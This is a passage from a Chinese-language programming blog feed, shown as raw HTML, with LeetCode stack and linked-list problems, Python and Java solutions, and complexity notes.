stack<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>            <span class="token keyword">if</span> dic<span class="token punctuation">.</span>get<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">is</span> None<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#待入栈元素在字典中无匹配元素即都是左括号 则 入栈</span>                stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">##若待入栈元素在字典中有匹配元素</span>                <span class="token keyword">if</span>  stack <span class="token operator">and</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span>dic<span class="token punctuation">.</span>get<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#并且stack不为空（防止s="]"的情况） 在栈顶匹配元素成功 则 将栈顶元素pop出</span>                    stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">##例如    s="(]"</span>                    <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> len<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析-2"><a href="#复杂度分析-2" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p>时间复杂度：O(n)，其中 n是字符串 s的长度。</p><p>空间复杂度：O(n+∣Σ∣)，其中 Σ 表示字符集，本题中字符串只包含 6 种括号，6∣Σ∣=6。栈中的字符数量为 O(n)，而哈希表使用的空间为 O(∣Σ∣)，相加即可得到总空间复杂度。</p><h2 id="4-leetcode1047-删除字符串中的所有相邻重复项"><a href="#4-leetcode1047-删除字符串中的所有相邻重复项" class="headerlink" title="4 leetcode1047. 删除字符串中的所有相邻重复项"></a>4 <a href="https://leetcode-cn.com/problems/remove-all-adjacent-duplicates-in-string/">leetcode1047. 删除字符串中的所有相邻重复项</a></h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>给出由小写字母组成的字符串 S，重复项删除操作会选择两个相邻且相同的字母，并删除它们。</p><p>在 S 上反复执行重复项删除操作，直到无法继续删除。</p><p>在完成所有重复项删除操作后返回最终的字符串。答案保证唯一。</p><p> 示例：</p><p>输入：”abbaca”<br>输出：”ca”<br>解释：<br>例如，在 “abbaca” 中，我们可以删除 “bb” 由于两字母相邻且相同，这是此时唯一可以执行删除操作的重复项。之后我们得到字符串 “aaca”，其中又只有 “aa” 可以执行重复项删除操作，所以最后的字符串为 “ca”。</p><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>充分理解题意后，我们可以发现，当字符串中同时有多组相邻重复项时，我们无论是先删除哪一个，都不会影响最终的结果。因此我们可以从左向右顺次处理该字符串。</p><p>而消除一对相邻重复项可能会导致新的相邻重复项出现，如从字符串abba 中删除 bb 会导致出现新的相邻重复项aa 出现。因此我们需要保存当前还未被删除的字符。一种显而易见的数据结构呼之欲出：栈。我们只需要遍历该字符串，如果当前字符和栈顶字符相同，我们就贪心地将其消去，否则就将其入栈即可。</p><p>本题要删除相邻相同元素，其实也是匹配问题，相同左元素相当于左括号，相同右元素就是相当于右括号，匹配上了就删除。类似于<a href="https://leetcode-cn.com/problems/valid-parentheses/">leetcode 20. 有效的括号</a></p><p>那么再来看一下本题：可以把字符串顺序放到一个栈中，然后如果相同的话 栈就弹出，这样最后栈里剩下的元素都是相邻不相同的元素了。</p><p><img src="/2020/05/16/leetcode-stackandqueue/delete.gif" alt="delete"></p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">removeDuplicates</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    :type s: str    :rtype: str    """</span>    stack<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        <span class="token keyword">if</span> stack <span class="token operator">and</span> i<span class="token operator">==</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#栈不为空  当和栈顶元素相等时候，pop栈顶元素</span>            stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#否则元素入栈</span>            stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析-3"><a href="#复杂度分析-3" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p>时间复杂度：O(n)，其中 n是字符串的长度。我们只需要遍历该字符串一次。</p><p>空间复杂度：O(n) 或 O(1)，取决于使用的语言提供的字符串类是否提供了类似「入栈」和「出栈」的接口。注意返回值不计入空间复杂度。</p><h2 id="5-1021-删除最外层的括号"><a href="#5-1021-删除最外层的括号" class="headerlink" title="5 1021. 删除最外层的括号"></a>5 <a href="https://leetcode-cn.com/problems/remove-outermost-parentheses/">1021. 删除最外层的括号</a></h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>有效括号字符串为空 “”、”(“ + A + “)” 或 A + B ，其中 A 和 B 都是有效的括号字符串，+ 代表字符串的连接。</p><p>例如，””，”()”，”(())()” 和 “(()(()))” 都是有效的括号字符串。<br>如果有效字符串 s 非空，且不存在将其拆分为 s = A + B 的方法，我们称其为原语（primitive），其中 A 和 B 都是非空有效括号字符串。</p><p>给出一个非空有效字符串 s，考虑将其进行原语化分解，使得：s = P_1 + P_2 + … + P_k，其中 P_i 是有效括号字符串原语。</p><p>对 s 进行原语化分解，删除分解中每个原语字符串的最外层括号，返回 s 。</p><p>示例 1：</p><p>输入：s = “(()())(())”<br>输出：”()()()”<br>解释：<br>输入字符串为 “(()())(())”，原语化分解得到 “(()())” + “(())”，<br>删除每个部分中的最外层括号后得到 “()()” + “()” = “()()()”。</p><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p><strong>思路：</strong>遍历字符串，遇到左括号就入栈，遇到右括号就出栈，每次栈空的时候，都说明找到了一个原语，记录下每个原语的起始位置和结束位置，<strong>取原字符串在原语的起始位置+1到原语的结束位置的子串便得到原语</strong>删除了最外层括号的字符串，拼接，即可解出答案。sssss</p><p>这道题本身并不麻烦，主要是理解这句原语的含义：</p><p>如果有效字符串 s 非空，且不存在将其拆分为 s = A + B 的方法，我们称其为原语</p><p>其实就是每获取一组左右括号相等的搭配后，将左右括号各删除一个，并保存即可。<br>由于这道题目提供的用例都是满足括号匹配关系的内容，使得这道题的难度就更低了。</p><p>我们创建一个字符串用于接收每次获取的原语进行拼接<br>然后创建一个栈，开始循环s，进行栈的入栈操作，每次入栈的是s的下标<br>左括号直接入栈，右括号时弹出栈顶，并判断栈是否为空，为空则代表找到一对匹配内容<br>此时获取栈顶index以及当前循环的下标i，ret += s[left+1:i]（删除最外层的左右括号）即可。</p><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">removeOuterParentheses</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type s: str        :rtype: str        """</span>        ret<span class="token operator">=</span><span class="token string">""</span>        stack<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#记录索引</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'('</span><span class="token punctuation">:</span>                stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                left<span class="token operator">=</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token operator">not</span> stack<span class="token punctuation">:</span>                    ret<span class="token operator">+=</span>s<span class="token punctuation">[</span>left<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span>        <span class="token keyword">return</span> ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/leetcode/">leetcode</category>
      
      
      <comments>https://m01ly.github.io/2020/05/16/leetcode-stackandqueue/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>链表相关题目</title>
      <link>https://m01ly.github.io/2020/05/07/leetcode-list/</link>
      <guid>https://m01ly.github.io/2020/05/07/leetcode-list/</guid>
      <pubDate>Thu, 07 May 2020 02:55:32 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;1前言&quot;&gt;&lt;a href=&quot;#1前言&quot; class=&quot;headerlink&quot; title=&quot;1前言&quot;&gt;&lt;/a&gt;1前言&lt;/h2&gt;&lt;p&gt;链表和数组一样都是线性结构，但是数组是一段连续的存储空间，而链表空间不一定保证连续，而是可以存在于内存中未被占用的任意位置为临时分配的。因此如果要找第i个元素的值，是不能直接获取的，只能从链表首元素通过next指针进行查找。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1前言"><a href="#1前言" class="headerlink" title="1前言"></a>1前言</h2><p>链表和数组一样都是线性结构，但是数组是一段连续的存储空间，而链表空间不一定保证连续，而是可以存在于内存中未被占用的任意位置为临时分配的。因此如果要找第i个元素的值，是不能直接获取的，只能从链表首元素通过next指针进行查找。  <a id="more"></a> 基于此，链表这种数据结构，除了要存储数据元素的信息外，还需要存储它的后继元素的存储地址。链表的组成结构如下图： </p><p><img src="/2020/05/07/leetcode-list/1625797112579.png" alt="1625797112579"></p><p>接着介绍下链表中几个重要概念：</p><p><strong>结点</strong>——链表所占用的一个内存块，一个结点包括数据域和指针域两部分。数据域用于存储数据信息data，指针域用于存储下个结点的地址next，通常叫做后继指针。</p><p><strong>头结点</strong>——链表中的第一个结点，只要知道了头结点在内存中的地址，就可根据其指针域存储的下一个结点的地址找到下一个结点。</p><p><strong>尾结点</strong>——链表中的最后一个结点，由于是链表中的最后一个结点，它的指针域存储的不是下一个结点的地址而是NULL，以此来表示是链表的尾结点。</p><p><strong>数组和链表对比</strong></p><table><thead><tr><th>种类</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>数组是一种<strong>连续</strong>存储线性结构，元素类型相同，大小相等</td><td>存取速度快</td><td>事先必须知道数组的长度;空间通常是有限制的;需要大块连续的内存块;插入删除元素的效率很低</td></tr><tr><td>链表是<strong>离散</strong>存储线性结构</td><td>空间没有限制；插入删除元素很快</td><td>节点的获取很慢</td></tr></tbody></table><h3 id="1-1链表分类"><a href="#1-1链表分类" class="headerlink" title="1.1链表分类"></a>1.1链表分类</h3><p>链表分类：</p><p><img src="/2020/05/07/leetcode-list/1624934516624.png" alt="1624934516624"></p><p>对于链表，如果用数组实现。那即是静态链表</p><p>链表按照连接方向分类分为： </p><ul><li>单向链表， <ul><li>一个节点有一个指针域属性，指向其后继节点，尾节点的后继节点为NULL。</li></ul></li><li>双向链表 <ul><li>一个节点两个指针域属性，分别指向其前驱，后继节点</li></ul></li></ul><p>链表按照有无环分类： </p><ul><li>循环链表 <ul><li>相比于单向链表，尾节点的后继节点为链表的首节点。</li></ul></li><li><h2 id="普通链表"><a href="#普通链表" class="headerlink" title="普通链表 "></a>普通链表 </h2></li></ul><h3 id="1-2链表的基本操作"><a href="#1-2链表的基本操作" class="headerlink" title="1.2链表的基本操作"></a>1.2链表的基本操作</h3><p>链表的题通常需要注意两点：</p><ol><li>舍得用变量，千万别想着节省变量，否则容易被逻辑绕晕</li><li>head 有可能需要改动时，先增加一个 假头为dummyhead，返回的时候直接取 假dummyhead.next，这样就不需要为修改 head 增加一大堆逻辑了。</li></ol><h4 id="1-2-1-向链表指定位置添加新的结点"><a href="#1-2-1-向链表指定位置添加新的结点" class="headerlink" title="1.2.1  向链表指定位置添加新的结点"></a>1.2.1  <strong>向链表指定位置添加新的结点</strong></h4><p>我们看下如何向链表的指定位置增加一个节点node。</p><p>由于链表的每个节点都存储了下一个节点的指针，因此，要想在指定位置增加一个节点node，就需要知道指定位置的前一个节点。首先明确下几个变量的含义：</p><ul><li>变量prev——表示前一个节点，比如节点2的前一个节点就是节点1。</li><li>变量head——表示头结点所在位置。</li><li>变量node——表示要添加的节点。</li></ul><p>如何将结点node添加到结点3所在的位置。</p><p>（1）首先，将变量prev向后移动一个位置，指向结点3的前一个结点2所在的位置。 </p><p>（2）将结点node的后继指针指向变量prev所指向结点的下一个结点，即node.next=prev.next </p><p>（3） 接着将变量prev所指向的结点的后继指针next指向node结点，即prev.next=node。这时，就将结点node添加到了原来结点3所在的位置。 </p><p><img src="/2020/05/07/leetcode-list/1625797288133.png" alt="1625797288133"></p><p>特殊的，如果需要将节点node插入head前，成为新的头节点要怎么做？</p><p>这时就要介绍一个链表操作中常用的一个方法了：<strong>设置虚拟头结点dummyHead，来简化操作难度。</strong></p><p>所谓虚拟头结点就是一个只存储下一个结点指针地址但不存储任何元素信息的节点。虚拟头结点的示例如下图，在有了虚拟头结点后，在向链表的头结点head所在位置添加元素时，操作方式就和向链表其它位置添加元素统一起来了。</p><p><strong>时间复杂度</strong></p><ul><li><p>如果是向链表头添加结点，则只需将新的结点的后继指针指向当前链表的头结点即可，时间复杂度是O(1)；</p></li><li><p>如果是向链表末尾添加结点，则需从头遍历链表直到尾部结点，因此此时的时间复杂度是O(n)；</p></li><li><p>如果是向链表任意位置添加结点，那么平均来看时间复杂度就是O(n)。</p></li></ul><h4 id="1-2-2-删除链表指定位置的结点"><a href="#1-2-2-删除链表指定位置的结点" class="headerlink" title="1.2.2  删除链表指定位置的结点"></a>1.2.2  <strong>删除链表指定位置的结点</strong></h4><p>删除链表指定位置的结点，还是借助虚拟头结点来简化操作。如下图，假设要删除链表中第二个结点2。 </p><ol><li>首先，将变量prev向后移动一个位置，指向待删除结点的前一个结点。 </li><li>接着，执行语句prev.next=delNode.next，即将变量prev所指向结点的后继指针next指向待删除结点的下一个结点</li><li>最后，执行delNode.next=null就可将待删除结点从链表中释放  最后，执行delNode.next=null就可将待删除结点从链表中释放 </li></ol><p><img src="/2020/05/07/leetcode-list/1625798952746.png" alt="1625798952746"></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> ListNode <span class="token function">deleteNode</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>       ListNode dummy<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ListNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dummy<span class="token punctuation">.</span>next<span class="token operator">=</span>head<span class="token punctuation">;</span>       ListNode curr<span class="token operator">=</span>dummy<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>curr<span class="token operator">!=</span>null<span class="token operator">&amp;&amp;</span>curr<span class="token punctuation">.</span>next<span class="token operator">!=</span>null<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//如果不加first != null,当需要删除的是最后一个节点时，就会有空指针异常</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>curr<span class="token punctuation">.</span>next<span class="token punctuation">.</span>val<span class="token operator">==</span>val<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                curr<span class="token punctuation">.</span>next<span class="token operator">=</span>curr<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>            curr<span class="token operator">=</span>curr<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> dummy<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>复杂度分析</strong></p><ul><li>如果是删除头结点，则虚拟头结点就是头结点的前一个结点，因此时间复杂度是O(1)；</li><li>如果是删除链表末尾添加结点，则需从头遍历链表直到尾部结点的前一个结点，因此此时的时间复杂度是O(n)；</li><li>如果是删除链表中任意结点，那么平均来看时间复杂度就是O(n)。</li></ul><h3 id="1-3-链表相关题目"><a href="#1-3-链表相关题目" class="headerlink" title="1.3 链表相关题目"></a>1.3 链表相关题目</h3><table><thead><tr><th align="left">题号</th><th align="left">题目</th><th>难度</th></tr></thead><tbody><tr><td align="left">leetcode 21</td><td align="left"><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/">合并两个有序链表</a></td><td>简单</td></tr><tr><td align="left">leetcode 203</td><td align="left"><a href="https://leetcode-cn.com/problems/remove-linked-list-elements/">移除链表元素</a></td><td>简单</td></tr><tr><td align="left">leetcode 206</td><td align="left"><a href="https://leetcode-cn.com/problems/reverse-linked-list/">反转链表</a></td><td>简单</td></tr><tr><td align="left">leetcode 92</td><td align="left"><a href="https://leetcode-cn.com/problems/reverse-linked-list/">反转链表 II</a></td><td>中等</td></tr><tr><td align="left">leetcode 141</td><td align="left"><a href="https://leetcode-cn.com/problems/linked-list-cycle/">环形链表</a></td><td>简单</td></tr><tr><td align="left">leetcode 142</td><td align="left"><a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/">环形链表II</a></td><td>中等</td></tr><tr><td align="left">剑指 Offer 22</td><td align="left"><a href="https://leetcode-cn.com/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/submissions/">链表中倒数第k个节点</a></td><td>简单</td></tr><tr><td align="left">leetcode 160/剑指 Offer 52</td><td align="left"><a href="https://leetcode-cn.com/problems/intersection-of-two-linked-lists/">两个链表的第一个公共节点</a></td><td>简单</td></tr><tr><td align="left">leetcode234</td><td align="left"><a href="https://leetcode-cn.com/problems/palindrome-linked-list/">回文链表</a></td><td>简单</td></tr><tr><td align="left">leetcode 83</td><td align="left"><a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list/">删除排序链表中的重复元素</a></td><td>简单</td></tr><tr><td align="left">leetcode 82</td><td align="left"><a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list-ii/">删除排序链表中的重复元素 II</a></td><td>中等</td></tr><tr><td align="left">leetcode 61</td><td align="left"><a href="https://leetcode-cn.com/problems/rotate-list/">旋转链表</a></td><td>中等</td></tr><tr><td align="left">leetcode 86</td><td align="left"><a href="https://leetcode-cn.com/problems/partition-list/">分隔链表</a></td><td>中等</td></tr></tbody></table><h2 id="2-leetcode21-合并两个有序链表"><a href="#2-leetcode21-合并两个有序链表" class="headerlink" title="2 leetcode21.合并两个有序链表"></a>2 <a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/">leetcode21.合并两个有序链表</a></h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>将两个升序链表合并为一个新的 <strong>升序</strong> 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 </p><p>示例1：</p><p>输入：l1 = [1,2,4], l2 = [1,3,4]<br>输出：[1,1,2,3,4,4]</p><p><strong>示例 2：</strong></p><p>输入：l1 = [], l2 = []<br>输出：[]</p><h3 id="方法一：递归法"><a href="#方法一：递归法" class="headerlink" title="方法一：递归法"></a>方法一：递归法</h3><p><strong>递归法注意输入是什么  输出是什么 需要关注两个点：终止条件和如何递归</strong></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>我们可以如下递归地定义两个链表里的 merge 操作（忽略边界情况，比如空链表等）：</p><p><img src="/2020/05/07/leetcode-list/1625554870067.png" alt="1625554870067"></p><p>也就是说，两个链表头部值较小的一个节点与剩下元素的merge操作结果合并。</p><p><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/solution/yi-kan-jiu-hui-yi-xie-jiu-fei-xiang-jie-di-gui-by-/">如何写呢：</a></p><p>终止条件：当两个链表都为空时，表示我们对链表已合并完成。<br>如何递归：我们判断 l1 和 l2 头结点哪个更小，然后较小结点的 next 指针指向其余结点的合并结果。（调用递归）</p><p><strong>执行过程：</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//(1,1):代表第一次进入递归函数，并且从第一个口进入，并且记录进入前链表的状态</span><span class="token function">merge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span>null<span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">6</span><span class="token operator">-</span><span class="token operator">></span>null    <span class="token function">merge</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span>null<span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">6</span><span class="token operator">-</span><span class="token operator">></span>null        <span class="token function">merge</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span>null<span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">6</span><span class="token operator">-</span><span class="token operator">></span>null            <span class="token function">merge</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span>null<span class="token punctuation">,</span> <span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">6</span><span class="token operator">-</span><span class="token operator">></span>null                <span class="token function">merge</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span>null<span class="token punctuation">,</span> <span class="token number">6</span><span class="token operator">-</span><span class="token operator">></span>null                    <span class="token function">merge</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span>null<span class="token punctuation">,</span> <span class="token number">6</span><span class="token operator">-</span><span class="token operator">></span>null                        <span class="token function">merge</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">:</span> null<span class="token punctuation">,</span> <span class="token number">6</span><span class="token operator">-</span><span class="token operator">></span>null                        <span class="token keyword">return</span> l2                    l1<span class="token punctuation">.</span>next <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">6</span><span class="token operator">-</span><span class="token operator">></span>null<span class="token punctuation">,</span> <span class="token keyword">return</span> l1                l1<span class="token punctuation">.</span>next <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">6</span><span class="token operator">-</span><span class="token operator">></span>null<span class="token punctuation">,</span> <span class="token keyword">return</span> l1            l2<span class="token punctuation">.</span>next <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">6</span><span class="token operator">-</span><span class="token operator">></span>null<span class="token punctuation">,</span> <span class="token keyword">return</span> l2        l2<span class="token punctuation">.</span>next <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">6</span><span class="token operator">-</span><span class="token operator">></span>null<span class="token punctuation">,</span> <span class="token keyword">return</span> l2    l2<span class="token punctuation">.</span>next <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">6</span><span class="token operator">-</span><span class="token operator">></span>null<span class="token punctuation">,</span> <span class="token keyword">return</span> l2l1<span class="token punctuation">.</span>next <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">4</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">-</span><span class="token operator">></span><span class="token number">6</span><span class="token operator">-</span><span class="token operator">></span>null<span class="token punctuation">,</span> <span class="token keyword">return</span> l1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Definition for singly-linked list.</span><span class="token comment" spellcheck="true"># class ListNode(object):</span><span class="token comment" spellcheck="true">#     def __init__(self, val=0, next=None):</span><span class="token comment" spellcheck="true">#         self.val = val</span><span class="token comment" spellcheck="true">#         self.next = next</span><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">mergeTwoLists</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> l1<span class="token punctuation">,</span> l2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type l1: ListNode        :type l2: ListNode        :rtype: ListNode        """</span>        <span class="token keyword">if</span> l1 <span class="token keyword">is</span> None<span class="token punctuation">:</span>            <span class="token keyword">return</span> l2        <span class="token keyword">elif</span> l2 <span class="token keyword">is</span> None<span class="token punctuation">:</span>            <span class="token keyword">return</span> l1        <span class="token keyword">elif</span> l1<span class="token punctuation">.</span>val<span class="token operator">&lt;</span>l2<span class="token punctuation">.</span>val<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#l1的当前头节点值更小，所以只需比较l1的下一个和l2头节点</span>            l1<span class="token punctuation">.</span>next<span class="token operator">=</span>self<span 